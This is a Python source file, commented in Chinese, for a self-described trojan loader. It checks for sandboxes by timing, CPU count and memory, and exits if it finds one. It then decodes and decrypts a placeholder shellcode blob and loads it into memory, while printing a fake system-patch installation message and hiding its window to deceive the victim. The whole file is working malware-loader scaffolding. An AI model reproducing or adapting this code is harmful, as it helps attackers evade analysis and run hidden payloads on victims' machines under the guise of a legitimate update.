import base64
import threading
import time
import psutil
from multiprocessing import cpu_count

from common.crypto_utils import crypto_utils
from common.LoadMemory import LoadMemory
import time
from loguru import logger


"""
  木马程序逻辑
"""


def check_vm():
    """
    反沙箱逻辑
    """
    logger.debug("开始执行沙箱检测逻辑")
    total = round(psutil.virtual_memory().total / (1024.0 * 1024.0 * 1024.0), 2)
    pre = int(time.time())

    time.sleep(2)
    now = int(time.time())
    if now-pre < 2:
        logger.debug("检测到沙箱")
        exit(1)
    if cpu_count() < 3:
        logger.debug("检测到沙箱")
        exit(0)
    if total < 2:
        logger.debug("检测到沙箱")
        exit(0)


def pwn():
    check_vm()
    shellcode_raw = b"666666666666"  # 待替换的shllcode
    shellcode = base64.b64decode(shellcode_raw)
    # print(shellcode)
    key, cipher = shellcode.split(b"||split||")
    crypto_utils.key = key
    plain_text_raw = crypto_utils.decrypt(cipher)
    LoadMemory.load_memory(plain_text_raw)


def ui():
    time.sleep(1)
    print("系统补丁安装程序，此过程将持续3-5分钟左右，请耐心等候，不要关闭此窗口")
    time.sleep(1)
    print("[+] KB20220617 补丁安装中，请稍等。。。 ")


def run():
    t = threading.Thread(target=pwn)
    t.start()
    ui()
    t.join()

    # multiprocessing.set_start_method("spawn")
    # p = multiprocessing.Process(target=pwn)
    # p.start()

    # p.join()


def launch():
    check_vm()
    import tkinter
    top = tkinter.Tk()
    top.title("漏洞补丁安装程序")
    top.geometry('0x0')
    top.resizable(0, 0)
    top["background"] = "#666"
    # top['borderwidth'] = '0'
    top.attributes('-alpha', 1)
    top.withdraw()  # 隐藏窗口
    # top.iconbitmap("./resource/photo.ico")
    run()
    top.mainloop()

    # pwn()


if __name__ == '__main__':
   launch()
